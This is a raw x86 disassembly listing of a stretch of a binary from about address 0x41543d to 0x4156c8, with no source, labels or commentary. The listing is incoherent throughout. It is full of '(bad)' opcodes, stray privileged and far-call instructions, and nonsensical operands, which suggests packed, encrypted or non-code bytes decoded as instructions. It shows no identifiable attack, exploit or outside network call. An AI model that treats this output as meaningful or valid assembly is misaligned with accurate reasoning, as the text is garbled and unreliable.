  41543d:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  415443:	xor    eax,DWORD PTR [eax]
  415445:	(bad)  
  415446:	ror    DWORD PTR [eax],0x4d
  415449:	jb     0x4153d6
  41544b:	add    BYTE PTR [ebx],dh
  41544d:	ja     0x4153d9
  41544f:	sbb    BYTE PTR ds:0x8d7275,cl
  415455:	cwde   
  415456:	enter  0x50e8,0xf3
  41545a:	inc    ebp
  41545b:	dec    DWORD PTR [ebx-0x7574ccbb]
  415461:	fadd   DWORD PTR ds:0xc372c7
  415467:	ror    DWORD PTR [ebp+0x13],0x8b
  41546b:	inc    ebp
  41546c:	xor    esi,DWORD PTR [ebx]
  41546e:	mov    al,BYTE PTR [ebx]
  415470:	or     eax,0x187250
  415475:	inc    ebp
  415476:	rcl    DWORD PTR [eax+0x4d],0xdc
  41547a:	mov    edi,edi
  41547c:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  415482:	jb     0x41540d
  415484:	add    ah,bl
  415486:	shl    DWORD PTR [ebp+0x4d],0xff
  41548a:	mov    ebx,esp
  41548c:	xor    eax,DWORD PTR [ebp-0x76]
  41548f:	add    ecx,DWORD PTR ds:0xe87208
  415495:	repz enter 0x10ff,0x45
  41549a:	inc    ebp
  41549b:	mov    edx,DWORD PTR [eax-0x28]
  41549e:	xor    bh,al
  4154a0:	inc    ebx
  4154a2:	mov    eax,ecx
  4154a4:	mov    eax,0xa00c111
  4154a9:	jne    0x4154f0
  4154ab:	mov    esi,DWORD PTR [ebx]
  4154ad:	test   al,0x3
  4154af:	inc    ebp
  4154b0:	mov    DWORD PTR [eax-0xc],edx
  4154b3:	mov    ds:0x8b33ff45,al
  4154b8:	lea    edx,[eax]
  4154ba:	xor    BYTE PTR [ebp+0x72],cl
  4154bd:	add    DWORD PTR [eax],eax
  4154bf:	mov    eax,edi
  4154c1:	lods   al,BYTE PTR ds:[esi]
  4154c2:	dec    ebp
  4154c3:	inc    ebp
  4154c4:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4154ca:	retf   
  4154cb:	mov    edx,ecx
  4154cd:	adc    al,0x84
  4154cf:	(bad)  
  4154d0:	std    
  4154d1:	ret    
  4154d2:	jmp    FWORD PTR [edi-0x37474bb]
  4154d8:	hlt    
  4154d9:	push   ebp
  4154da:	(bad)  
  4154db:	xor    eax,ebx
  4154dd:	(bad)  
  4154de:	enter  0x1111,0x72
  4154e2:	inc    ebp
  4154e3:	add    BYTE PTR [ebx-0x387deb3f],cl
  4154e9:	cld    
  4154ea:	test   bh,bh
  4154ec:	pushf  
  4154ed:	inc    ebp
  4154ee:	xor    bl,BYTE PTR [edi-0x15]
  4154f1:	pop    ebx
  4154f2:	push   0xffffffc2
  4154f4:	inc    DWORD PTR [eax]
  4154f6:	in     al,dx
  4154f7:	mov    eax,DWORD PTR [ebp+0x51]
  4154fa:	push   eax
  4154fb:	inc    ebp
  4154fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fd:	mov    edi,edi
  4154ff:	or     BYTE PTR [ebx+0x4d80fc16],cl
  415505:	add    DWORD PTR [ebx],esi
  415507:	add    BYTE PTR [ebx],al
  415509:	add    BYTE PTR [ebx],bh
  41550b:	icebp  
  41550c:	je     0x415516
  41550e:	mov    eax,DWORD PTR [edi]
  415510:	cld    
  415511:	rol    edi,0x72
  415514:	ret    
  415515:	add    BYTE PTR [edx-0x2f],ch
  415518:	lea    edx,[eax]
  41551a:	cwde   
  41551b:	jne    0x415505
  41551d:	(bad)  
  41551e:	clc    
  41551f:	or     al,0xff
  415521:	inc    DWORD PTR [ebp-0x18]
  415524:	cmp    ebx,0x18
  415527:	inc    DWORD PTR [ebp+0x6]
  41552a:	call   FWORD PTR [ebp-0x54]
  41552d:	or     al,0x75
  41552f:	push   ebp
  415530:	mov    ebp,esp
  415532:	test   al,0x53
  415534:	inc    ebp
  415535:	mov    edx,DWORD PTR [eax-0x75]
  415538:	imul   ecx,DWORD PTR [eax],0xffffffff
  41553b:	dec    ebp
  41553c:	mov    edx,DWORD PTR [edi-0x4]
  41553f:	push   ebp
  415540:	dec    ebp
  415541:	push   ecx
  415542:	xor    esi,DWORD PTR [ebx]
  415544:	add    edi,DWORD PTR [edi+0x74723b]
  41554a:	push   0xffffffc7
  41554c:	inc    DWORD PTR [ecx]
  41554e:	lods   al,BYTE PTR ds:[esi]
  41554f:	inc    ebp
  415550:	inc    ebp
  415551:	mov    eax,DWORD PTR [ebx]
  415553:	xchg   esp,eax
  415554:	or     BYTE PTR [eax],al
  415556:	call   0xffcd4de6
  41555b:	adc    al,0x45
  41555d:	or     BYTE PTR [ebx+0x800ac01],0x0
  415564:	inc    ebp
  415565:	inc    ecx
  415566:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41556c:	mov    eax,DWORD PTR [ecx]
  41556e:	call   0x338aa273
  415573:	push   0x3
  415575:	push   0xc1300f
  41557a:	dec    ebp
  41557b:	jo     0x415508
  41557d:	push   0xffffffd4
  41557f:	dec    edi
  415581:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  415588:	cmp    eax,edi
  41558a:	cmovne edx,DWORD PTR [edi-0x75]
  41558e:	call   DWORD PTR [eax]
  415590:	mov    eax,DWORD PTR [ebp+0x8]
  415593:	call   FWORD PTR [esi+0x14]
  415596:	leave  
  415597:	inc    ebp
  415598:	adc    BYTE PTR [eax+0x55],dl
  41559b:	jne    0x415589
  41559d:	call   0xff52552d
  4155a2:	dec    ebp
  4155a3:	inc    ebp
  4155a4:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4155aa:	add    BYTE PTR [ebx],bh
  4155ac:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4155b0:	push   ebp
  4155b1:	or     al,0x51
  4155b3:	dec    ebp
  4155b4:	xor    DWORD PTR [ebx],0xf32039c
  4155ba:	cmp    eax,DWORD PTR [ebp+0x74]
  4155bd:	mov    edi,edi
  4155bf:	pop    edi
  4155c0:	adc    BYTE PTR [ebx+0x75],bl
  4155c3:	ret    0x50
  4155c6:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  4155ca:	(bad)  
  4155cb:	clc    
  4155cc:	mov    esp,ebp
  4155ce:	pop    ecx
  4155cf:	mov    ecx,0xf80085c2
  4155d4:	mov    ecx,DWORD PTR [ecx+edx*2]
  4155d7:	push   esi
  4155d8:	push   esi
  4155d9:	(bad)  
  4155da:	lock inc DWORD PTR [ebp+0x44]
  4155de:	mov    edx,DWORD PTR [eax]
  4155e0:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4155e4:	or     BYTE PTR [ebp+0x7],dl
  4155e7:	push   ecx
  4155e8:	ret    
  4155e9:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  4155f0:	mov    esi,edi
  4155f2:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  4155f6:	cmp    BYTE PTR [ebp+0x1],0x89
  4155fa:	add    BYTE PTR [eax+ecx*1],ah
  4155fd:	cmp    DWORD PTR [ebp+0x10],eax
  415600:	mov    edx,DWORD PTR [esi]
  415602:	xchg   esp,eax
  415603:	dec    esp
  415604:	add    BYTE PTR [eax],dl
  415606:	mov    ecx,edx
  415608:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41560c:	dec    ebp
  41560d:	into   
  41560e:	mov    ebp,DWORD PTR [edi+0x240089d8]
  415614:	mov    edx,DWORD PTR [eax+0x14]
  415617:	das    
  415618:	add    al,0x45
  41561a:	add    BYTE PTR [ebp+0x0],dh
  41561d:	mov    edi,edi
  41561f:	and    al,0x50
  415621:	mov    eax,DWORD PTR [eax]
  415623:	and    al,0xd1
  415625:	xor    eax,DWORD PTR [esi]
  415627:	lea    eax,[ebp+0x8]
  41562a:	xor    esi,DWORD PTR [edx+0x3]
  41562d:	add    BYTE PTR [ecx+0x4510fc44],cl
  415633:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  415639:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  415643:	xor    bh,bh
  415645:	pushf  
  415646:	mov    edi,edi
  415648:	or     BYTE PTR [esi+ecx*1],cl
  41564b:	jne    0x415610
  41564d:	call   0xa5619
  415652:	adc    BYTE PTR [ebp+eax*2+0xc],al
  415656:	mov    ebx,DWORD PTR [eax]
  415658:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41565c:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  415664:	pop    esi
  415665:	dec    ecx
  415667:	and    al,0x10
  415669:	call   DWORD PTR [ebp+0x24]
  41566c:	in     al,dx
  41566d:	call   0xffc55556
  415672:	adc    BYTE PTR [ecx+esi*1+0xc],al
  415676:	pushf  
  415677:	pop    esi
  415678:	mov    ebp,esp
  41567a:	and    al,0xc2
  41567c:	push   edi
  41567d:	add    BYTE PTR [ecx+0x33],al
  415680:	mov    DWORD PTR [ebp+0x24],esi
  415683:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  415689:	dec    DWORD PTR [eax]
  41568b:	and    al,0x7
  41568d:	(bad)  
  41568e:	cli    
  41568f:	and    al,0x9c
  415691:	or     BYTE PTR [edx],dh
  415693:	sbb    BYTE PTR [ebx],al
  415695:	adc    al,0x89
  415697:	jmp    DWORD PTR [esp]
  41569a:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  4156a0:	adc    al,0x8
  4156a2:	dec    ebp
  4156a3:	adc    BYTE PTR [ebp-0x7c],dh
  4156a6:	mov    esi,DWORD PTR [edx]
  4156a8:	and    al,0x24
  4156aa:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  4156b0:	add    edi,eax
  4156b2:	pcmpeqb mm1,mm2
  4156b5:	jmp    0x415703
  4156b7:	dec    DWORD PTR [eax]
  4156b9:	je     0x4156a6
  4156bb:	mov    edi,DWORD PTR [ecx]
  4156bd:	pop    ebp
  4156be:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  4156c2:	pushf  
  4156c3:	mov    DWORD PTR [eax-0x8],ebp
  4156c6:	jge    0x415730
  4156c8:	dec    DWORD PTR [ecx+0x5fbf7424]
